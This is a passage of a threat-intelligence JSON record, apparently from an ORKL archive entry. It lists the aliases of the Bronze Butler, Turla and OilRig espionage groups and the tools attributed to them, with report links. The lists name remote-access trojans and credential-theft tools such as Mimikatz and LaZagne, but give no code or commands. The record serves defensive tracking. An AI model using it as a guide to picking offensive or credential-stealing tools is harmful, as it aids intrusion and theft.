                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1590090482,
    "ts_modification_date": 1590425922,
    "files": {
        "pdf": "https://archive.orkl.eu/7bcdfae2ef025893a57007a928a4c633f6beea1d.pdf",
        "text": "https://archive.orkl.eu/7bcdfae2ef025893a57007a928a4c633f6beea1d.txt",
        "img": "https://archive.orkl.eu/7bcdfae2ef025893a57007a928a4c633f6beea1d.jpg"
    }
}